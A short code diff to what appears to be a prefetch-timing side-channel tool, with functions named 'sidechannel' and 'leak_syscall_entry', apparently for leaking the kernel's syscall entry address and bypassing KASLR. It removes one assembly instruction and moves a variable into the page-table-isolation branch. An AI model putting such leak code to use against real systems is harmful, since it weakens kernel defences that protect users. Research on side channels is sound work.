@@ -11,7 +11,6 @@ uint64_t sidechannel(size_t addr) {
     "mfence;"
     "prefetcht0 qword ptr [%4];"
     "prefetcht0 qword ptr [%4];"
-    "xor rax, rax;"
     "mfence;"
     "rdtscp;"
     "mov %2, rax;"
@@ -74,9 +73,8 @@ uint64_t leak_syscall_entry(int pti,int boost)
         }
         // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
     }
-    int previous_data = data[1];
-
     if(pti){
+        int previous_data = data[1];
         // More analysis for pti
         for(int i = 2; i< ARR_SIZE; i++)
         {
